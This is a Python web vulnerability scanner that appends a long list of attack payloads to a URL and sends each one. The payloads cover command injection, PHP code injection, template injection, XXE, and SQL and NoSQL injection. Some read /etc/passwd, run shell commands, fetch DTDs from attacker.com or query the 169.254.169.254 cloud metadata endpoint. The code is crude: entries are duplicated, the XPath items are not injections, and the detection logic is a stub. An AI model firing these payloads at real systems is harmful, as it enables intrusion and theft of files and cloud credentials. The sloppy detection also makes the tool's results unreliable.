import requests
from bs4 import BeautifulSoup

# Example payloads targeting various vulnerabilities

payloads = [

    # Command Injection payloads
    ";ls -la",
    ";id",
    "$(uname -a)",
    "&& ls -la",
    "| ls -la",
    ";ping -c 1 localhost",
    ";cat /etc/passwd",
    "$(cat /etc/passwd)",
    "&& cat /etc/passwd",
    "| cat /etc/passwd",
    "$(echo vulnerable)",
    "$(echo -e vulnerable)",
    "$(sleep 10)",
    "$(nslookup example.com)",
    "$(echo `id`)",
    ";nslookup example.com",
    ";echo vulnerable",

    # PHP Code Injection payloads
    "<?php echo 'Vulnerable'; ?>",
    "<?php echo shell_exec('ls'); ?>",
    "<?php system('ls'); ?>",
    "<?php system('id'); ?>",
    "<?php system('uname -a'); ?>",
    "<?php include('/etc/passwd'); ?>",
    "<?php require('/etc/passwd'); ?>",
    "<?php echo file_get_contents('/etc/passwd'); ?>",

    # Server-Side Template Injection (SSTI) payloads
    "{{'a' * 100}}",
    "{{config}}",
    "{{self}}",
    "{{self.__init__.__globals__['os'].popen('ls').read()}}",
    "{{self.__class__.__base__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[0].__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[0].__subclasses__()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[0].__subclasses__()}}",

   # XPath Injection payloads (additional)
    "/bookstore/book[author='Smith']/title",
    "/bookstore/book[price>35]/title",
    "/bookstore/book[contains(title,'Java')]/title",
    "/bookstore/book[author/text()='John Doe']/title",
    "/bookstore/book[author/text()='John Doe']/title/../@*",
    "/bookstore/book[position()=1]/title",
    "/bookstore/book[last()]/title",
    "/bookstore/book[1]/title",
    "/bookstore/book[position()=1]/title",
    "/bookstore/book[not(author)]/title",

    # XML External Entity (XXE) Injection payloads (additional)
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil.xml"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]><foo></foo>',
    '<?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//OXML/EN" "http://attacker.com/evil.dtd"><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:22"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]><foo>&xxe;</foo>',

    # SQL Injection payloads (additional)
    "' OR 1=1--",
    "' OR 'a'='a",
    "1' OR '1'='1",
    "' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x7171787171, 0x4b4a6e464150676c6f594e6f5062416d4545444f4e634f45514d4752764f4b4d4f554c566f6e4e, 0x7170627671), NULL, NULL, NULL, NULL, NULL, NULL-- ",
    "' OR 1=1#",
    "' OR '1'='1#",
    "' OR 1=1/*",
    "' OR '1'='1/*",
    "') OR '1'='1--",
    "') OR ('1'='1)--",
    "1'1",
    "1'1'",
    '"1"1"',
    '"1"1"1"',
    "`1`1`",
    "`1`1`1`",

    # NoSQL Injection payloads (additional)
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$regex": "^admin"}, "password": {"$regex": "^password"}}',
    '{"email": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$ne": null}, "password": {"$gt": ""}}',
    '{"email": {"$regex": "^admin"}, "password": {"$regex": "^password"}}',

]

def scan_for_rce_vulnerabilities(url):
    vulnerabilities = []
    try:
        response = requests.get(url)
        if response.status_code == 200:
            for payload in payloads:
                # Add payload to the URL and send request
                test_url = url + payload
                test_response = requests.get(test_url)
                
                # Example of response analysis (replace with your actual logic)
                if test_response.status_code == 200 and 'Vulnerable' in test_response.text:
                    vulnerabilities.append(f"Potential vulnerability detected with payload: {payload}")
                elif test_response.status_code == 404:
                    vulnerabilities.append(f"Page not found with payload: {payload}")
                else:
                    vulnerabilities.append(f"No vulnerability detected with payload: {payload}")
                    
        else:
            vulnerabilities.append(f"Failed to access {url} (status code: {response.status_code})")
    except Exception as e:
        vulnerabilities.append(f"Error occurred: {str(e)}")
    
    return vulnerabilities
